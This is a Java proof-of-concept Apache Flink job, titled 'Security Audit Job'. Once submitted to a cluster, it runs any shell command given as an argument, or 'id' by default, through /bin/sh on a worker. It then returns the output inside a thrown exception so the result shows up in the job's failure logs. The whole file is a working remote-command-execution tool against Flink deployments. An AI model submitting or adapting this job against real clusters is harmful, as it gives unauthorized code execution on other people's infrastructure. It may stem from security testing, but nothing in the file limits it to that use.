import org.apache.flink.api.common.restartstrategy.RestartStrategies;
import org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.stream.Collectors;

public class PocJob {
    public static void main(String[] args) throws Exception {
        final StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();
        
        // disable automatic restarts to see the exception clearly
        env.setRestartStrategy(RestartStrategies.noRestart());
        env.setParallelism(1);

        // Get Shell command from program arguments or use default id
        final String commandToRun = (args.length > 0) ? String.join(" ", args) : "id";

        env.fromElements("trigger")
           .map(x -> {
               StringBuilder result = new StringBuilder();
               try {
                   // Run the command and capture output
                   ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", commandToRun);
                   pb.redirectErrorStream(true);
                   Process p = pb.start();
                   
                   try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                       String line;
                       while ((line = r.readLine()) != null) {
                           result.append(line).append(" | ");
                       }
                   }
                   
                   if (result.length() == 0) {
                       result.append("Exit code: ").append(p.waitFor()).append(" (No output)");
                   }
               } catch (Exception e) {
                   result.append("Java Error: ").append(e.getMessage());
               }

               // send the result to the sink (print) and also throw an exception to fail the job
               throw new RuntimeException("\n\n=== COMMAND RESULT ===\n" + result.toString() + "\n======================\n");
           })
           .print();

        env.execute("Security Audit Job");
    }
}
